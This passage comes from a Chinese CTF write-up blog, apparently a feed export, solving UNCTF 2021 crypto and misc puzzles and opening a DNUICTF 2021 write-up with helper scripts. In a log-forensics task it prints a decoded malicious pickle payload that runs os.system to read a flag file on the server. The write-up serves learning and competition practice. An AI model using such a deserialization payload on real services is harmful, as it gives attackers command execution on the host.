delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    s = <span class="string">&#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27;</span></span><br><span class="line">    s = [s[<span class="number">8</span>*k:<span class="number">8</span>*k+<span class="number">8</span>] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">8</span>)]</span><br><span class="line">    s = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>].<span class="built_in">hex</span>() <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    encrypted = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    decrypted = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted][:-<span class="number">1</span>]</span><br><span class="line">    flag = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;</code></p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><blockquote><p>简单的RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q= <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p= <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c= <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA基操。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">q = <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p =  <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c = <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="探秘中世纪城堡"><a href="#探秘中世纪城堡" class="headerlink" title="探秘中世纪城堡"></a>探秘中世纪城堡</h3><blockquote><p>贝拉在参观一个中世纪的古堡时，在桌上看到了一串一奇怪的字符和描述。你能帮大聪明破解皇珈骑士留下来的谜团吗？</p><p>年轻的大帝率领着64位皇珈骑士冲破了双重阻栏夺下了城池。<br>AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259</p></blockquote><p>ROT21+base64+栅栏2。</p><p>flag：<code>UNCTF&#123;subscribe_to_Xiangwandamowang&#125;</code></p><p>​    </p><h3 id="分析badusb流量"><a href="#分析badusb流量" class="headerlink" title="分析badusb流量"></a>分析badusb流量</h3><blockquote><p>一日，某企业的安全管理员发现企业中的电脑遭到了badusb的侵害，以下他分离出来的有问题USB流量，而这似乎跟键盘的键位映射有关。</p><p>2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030</p></blockquote><p>键盘键位映射规则，映射关系参考<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">《USB键盘协议中键码》中的HID Usage ID</a>。</p><p>前两位20代表大写，10代表小写，后两位为键码，对照写flag。</p><p>flag：<code>UNCTF&#123;Y0u-Are-very-n1ce&#125;</code></p><p>​    </p><h3 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag=<span class="string">&quot;unctf&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m*p+n,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="comment">#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line"><span class="comment">#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line"><span class="comment">#e= 65537</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = (mp+n)^e \% n = p^e(m+q)^e \% n $，</p><p>有 $c\%p = p^e(m+q)^e \% p = \Big((p^e \% p)\big((m+q)^e \% p\big)\Big) \% p=0$，</p><p>故 $c=kp$，又 $n=pq$，则 $p=\gcd(c,n)$。</p><p>求出 $d \equiv e^{-1} \pmod {\varphi(n)}$，可以得到 $m’ = mp+n = c^d \% n$，所以 $m = \cfrac{m’-n}{p}$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line">c = <span class="number">3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n,c)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n)-n)//p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;rsa_s1mp1e_0kk&#125;</code></p><p>​    </p><h3 id="电信诈骗pro"><a href="#电信诈骗pro" class="headerlink" title="电信诈骗pro"></a>电信诈骗pro</h3><blockquote><p>朕是秦始皇，其实朕没有死，朕在西安兵马俑第四个坑第七排，朕是吃了长生不老药的，朕告诉你啊，朕在陕西有3000吨黄金和300万秦兵被封印，现在只需要30元就能解封，只要你打钱给朕，朕明天直接带部队复活，让你统领三军!建立像古罗马一样的帝国，君无戏言！ 朕的账户是<code>5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7=</code></p><p>flag格式为unctf{}</p></blockquote><p>尝试异或爆破，发现异或0x40有 <code>unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;</code>，说明中间加密方式不同。</p><p>提取中间部分尝试出是ROT47+凯撒17：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\gWIf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(i,t)</span><br></pre></td></tr></table></figure><p>其中 <code>5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw</code> base64解码是 <code>别解了，那个就是flag</code>。</p><p>flag：<code>unctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125;</code></p><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="简单日志审计"><a href="#简单日志审计" class="headerlink" title="简单日志审计"></a>简单日志审计</h3><blockquote><p>相传，在某一归隐门派的服务器里存在着众多盖世绝学，谁掌握了任一一本绝学谁就能一统CTF江湖，突然有一天门派的长老发现服务器的日志里存在着些许异常，或许这门绝学已经失窃了，请帮帮长老找出失窃的是哪一本绝学吧。flag格式为UNCTF{*}</p></blockquote><p>日志文件里找到base64编码字符串 <code>STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu</code>，</p><p>解码得pickle：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /CTF?YouShouJiuXing&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>flag：<code>UNCTF&#123;CTF?YouShouJiuXing&#125;</code></p><p>​    </p><h3 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a>电信诈骗</h3><blockquote><p>CTFer,你好，我是威震天！其实我在芝加哥大战中没死，现在你只需要打2000RMB到我的银行账户，我就可以用这2000RMB发红包骗取人们的信任，然后穿过股市网络找到震荡波在纽约给我找的新身体，然后我就可以复活了。今天如果你帮了我，复活后我可以入侵股市网络把钱全部给你们。等过了周末，我就让红蜘蛛变成飞机去接你，然后我把红蜘蛛杀了，让你当霸天虎副指挥官，然后我们从南极洲呈扩散式发出霸天虎军队，万军齐发，占领地球，怎么样？为了防止这条消息被擎天柱拦截。我将银行卡号进行了加密，希望你能成功解密。我的银行账户是 <code>qi]m^roVibdVbXUU`h</code> </p><p>flag格式：unctf{}</p></blockquote><p>变异凯撒加密，脚本爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;qi]m^roVibdVbXUU`h&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i+j &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i+j&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i+j)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>flag：<code>unctf&#123;yauoreright&#125;</code></p><p>​    </p><h3 id="引大流咯，happy"><a href="#引大流咯，happy" class="headerlink" title="引大流咯，happy"></a>引大流咯，happy</h3><blockquote><p>虚掩的大门后是一副残缺的画卷。</p></blockquote><p>修改jpg高度发现flag。</p><p>flag：<code>UNCTF&#123;BellalaBella&#125;</code></p><p>​    </p><h3 id="倒立洗头"><a href="#倒立洗头" class="headerlink" title="倒立洗头"></a>倒立洗头</h3><p>观察文件字符串头尾分别是 <code>d9ff</code> 和 <code>ffd8</code>，脚本逆序处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(<span class="built_in">bytes</span>.fromhex(f)[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>把文件头 <code>D8FF</code> 修正为 <code>FFD8</code>，图片没什么异常，在中间发现字符串：</p><p><code>5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg==</code></p><p>解码：</p><p><code>佛日：上俱故。遠大密隸怯除多皤孕耨爍梵地諳薩侄究缽老諳不想皤者滅罰輸缽阿侄滅梵夢侄不冥吉真梵沙缽度即缽隸怯明侄切侄知呐地南呼舍咒奢佛涅哆姪神密明哆逝室地恐冥呼怯佛喝哆伽都怯遮諳倒缽帝冥帝輸曰諳麼俱怖俱苦俱波</code></p><p>把 <code>日</code> 改为 <code>曰</code>，佛曰解密得flag。</p><p>flag：<code>unctf&#123;it_is_easy_right?&#125;</code></p><p>​    </p><h3 id="LPL"><a href="#LPL" class="headerlink" title="LPL"></a>LPL</h3><p>png图片用010 editor查看，第9-15个块CRC值错误，提取Hex值 <code>4544476e622121</code>，解Hex得 <code>EDGnb!!</code>。</p><p>以此为密码解压缩包，flag.txt 提示 <code>https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0</code>，以及一个 <code>2021/11/24 14:11</code> 的时间，访问B站视频在评论区找到 <code>2021/11/24 14:11</code> 的评论见flag。</p><p>flag：<code>flag&#123;LpL_zgbr_rNg_eDg777&#125;</code></p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;为响应国家选拔、推荐优秀网络空间安全专业人才，培养学生的创新意识与团队合作精神，提高大学生的网络安全技术水平、创新实践与综合设计能力，推动我国高校网络空间安全专业建设与改革，全国9所高校（闽南师范大学，福州大学至诚学院，重庆大学，陆军工程大学，南京</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第一届东软杯网络CTF竞赛-DNUICTF</title>
    <link href="https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/"/>
    <id>https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/</id>
    <published>2021-12-05T12:40:24.000Z</published>
    <updated>2021-12-05T17:56:56.779Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>由大连市公安局作为指导单位，大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持的“暗泉杯”网络安全竞赛将于2021年12月份举行。该竞赛是运用信息安全知识的一次创新性竞赛活动，希望通过这次比赛增强我校学生的安全知识运用能力和经验积累。本次比赛也面向校外开放注册通道，旨在为信息安全领域爱好者提供一个交流和水平展示的舞台。</p><p>本次竞赛采用线上CTF（Capture The Flag，夺旗赛）赛制。选手充分运用自身掌握的各方面的知识与技能，设法解开题目，获得题目中的“Flag”并提交，得到分数，最终根据分数排名。内容涉及Reverse(逆向分析)，Web(Web漏洞利用)，PWN（溢出类），Crypto(密码学)，Misc(混合杂项题)等方面。</p><p>竞赛时间</p><p>2021年12月4日 10：00—2021年12月5日22：00（36个小时）</p><p>报名平台链接：<a href="http://ctf.neusoft.edu.cn/">http://ctf.neusoft.edu.cn/</a></p><p><strong>Rank: 9</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到-签到"><a href="#签到-签到" class="headerlink" title="[签到]签到"></a>[签到]签到</h3><blockquote><p>除特别说明外本次比赛flag的格式统一为 flag{字符串}</p><p>比如下面这个就是一个典型的flag</p><p>flag{Dnui_ctf_2021_s1gn_in}</p><p>将上面的flag提交即可完成答题</p><p>另外本次CTF比赛会根据整体解题情况分批次放出题目 (解不出题时 可以等待下一波新题目放出继续作答)</p><p>请加入QQ群 630995618 或查看平台公告 关注题目动态</p></blockquote><p><code>flag&#123;Dnui_ctf_2021_s1gn_in&#125;</code>。</p><p>​    </p><h3 id="萌新-在哪呢"><a href="#萌新-在哪呢" class="headerlink" title="[萌新]在哪呢"></a>[萌新]在哪呢</h3><blockquote><p>FLAG在哪呢</p></blockquote><p>pdf内容全选复制，打开任一文本编辑器粘贴，发现flag：<code>flag&#123;hey_there_is_no_thing&#125;</code>。</p><p>​    </p><h3 id="只是个PNG，别想太多了-png"><a href="#只是个PNG，别想太多了-png" class="headerlink" title="只是个PNG，别想太多了.png"></a>只是个PNG，别想太多了.png</h3><p>binwalk命令查看png图片：<code>binwalk -e PNG.png</code>，分解出最后一个zlib块，发现flag：<code>flag&#123;zhe_ti_mu_ye_tai_bt_le_XD&#125;</code>。</p><p>​    </p><h3 id="压缩包压缩包压缩包压缩包"><a href="#压缩包压缩包压缩包压缩包" class="headerlink" title="压缩包压缩包压缩包压缩包"></a>压缩包压缩包压缩包压缩包</h3><p>zip压缩包套娃，每一层的密码是文件名，python脚本解套：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;yasuobao.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;START &quot;</span>+now)</span><br><span class="line">zfile = zipfile.ZipFile(now)</span><br><span class="line">password = zfile.namelist()[<span class="number">0</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zfile.extractall(members=zfile.namelist(), pwd=password.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">zfile.close()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.remove(now)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">names = os.listdir()</span><br><span class="line"><span class="built_in">print</span>(names)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line"><span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">now=name</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;END &#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>最后解压得到 <code>23333.zip</code>，打开发现注释提示密码6位数，ARCHPR爆破得756698，解压得flag：<code>flag&#123;Unz1p_i5_So_C00l##&#125;</code>。</p><p>​    </p><h3 id="easysteg"><a href="#easysteg" class="headerlink" title="easysteg"></a>easysteg</h3><p>png图片，二维码用微信扫出内容 <code>某种常见的隐写</code>，用010editor 16进制查看，发现尾部有zip压缩包，提取出来，解压出 <code>_find.png</code>。</p><p>尝试高低位隐写、盲水印等无结果，考虑stegpy：</p><p><code>stegpy _find.png</code></p><p>得到flag：<code>flag&#123;Do_U_Kn0w_Ste9py??&#125;</code>。</p><p>​    </p><h3 id="range-download"><a href="#range-download" class="headerlink" title="range_download"></a>range_download</h3><blockquote><p>Hint: filter: dns</p></blockquote><p>Wireshark打开流量包文件，观察到有很多返回1字节的流，且请求中都带 <code>xxx-xxx/2460</code> 字符串，猜测为文件 <code>flag.7z</code> 的单字节断点下载 ，根据请求与响应特征，用脚本提取出所有1字节，并按相应位置填入数组，以字节形式写入文件。发现缺少第2349位字节，按照0x00-0xff分别填入，生成256个7z文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;range.pcapng&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">x1 = <span class="string">b&#x27;\x0d\x0aContent-Range: bytes &#x27;</span></span><br><span class="line">l1 = <span class="built_in">len</span>(x1)</span><br><span class="line">pos1 = [i.start() <span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(x1, f)]</span><br><span class="line">x2 = <span class="string">b&#x27;\x0d\x0aContent-Type: application/x-7z-compressed\x0d\x0a\x0d\x0a&#x27;</span></span><br><span class="line">l2 = <span class="built_in">len</span>(x2)</span><br><span class="line">pos2 = [i.start() <span class="keyword">for</span> i <span class="keyword">in</span> 